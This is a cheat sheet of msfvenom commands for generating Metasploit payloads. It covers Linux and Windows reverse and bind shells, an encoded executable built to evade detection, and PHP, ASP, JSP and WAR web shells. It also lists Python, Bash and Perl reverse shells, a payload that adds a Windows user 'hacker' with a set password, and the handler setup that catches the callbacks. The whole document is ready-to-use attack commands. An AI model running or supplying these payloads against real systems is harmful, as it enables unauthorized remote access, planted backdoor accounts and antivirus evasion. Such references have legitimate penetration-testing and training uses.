## MSFVenom Cheatsheet 

### Binaries Payloads

#### Linux Meterpreter Reverse Shell
```shell
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f elf > shell.elf
```
#### Linux Bind Meterpreter Shell
```shell
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=<Remote IP Address> LPORT=<Local Port> -f elf > bind.elf
```
#### Linux Bind Shell
```shell
msfvenom -p generic/shell_bind_tcp RHOST=<Remote IP Address> LPORT=<Local Port> -f elf > term.elf
```
#### Windows Meterpreter Reverse TCP Shell
```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f exe > shell.exe
```
#### Windows Reverse TCP Shell
```shell
msfvenom -p windows/shell/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f exe > shell.exe
```
#### Windows Encoded Meterpreter Windows Reverse Shell
```shell
msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
```
### Web Payloads
#### PHP Meterpreter Reverse TCP
```shell
msfvenom -p php/meterpreter_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.php
```
#### ASP Meterpreter Reverse TCP
```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f asp > shell.asp
```
#### JSP Java Meterpreter Reverse TCP
```shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.jsp
```
#### WAR
```shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f war > shell.wa
```
### Scripting Payloads
#### Python Reverse Shell
```shell
msfvenom -p cmd/unix/reverse_python LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.py
```
#### Bash Unix Reverse Shell
```shell
msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
```
#### Perl Unix Reverse shell
```shell
msfvenom -p cmd/unix/reverse_perl LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.pl
```
### Others
#### Create User
```shell
msfvenom -p windows/adduser USER=hacker PASS=Hacker123$ -f exe > adduser.exe
```
#### Avoid bad characters
```shell
msfpayload windows/shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> R | msfencode -b '\x00' -e x86/shikata_ga_nai -t perl
```
#### Metasploit Handler
```shell
use exploit/multi/handler
set PAYLOAD <Payload name>
Set RHOST <Remote IP>
set LHOST <Local IP>
set LPORT <Local Port>
Run
```
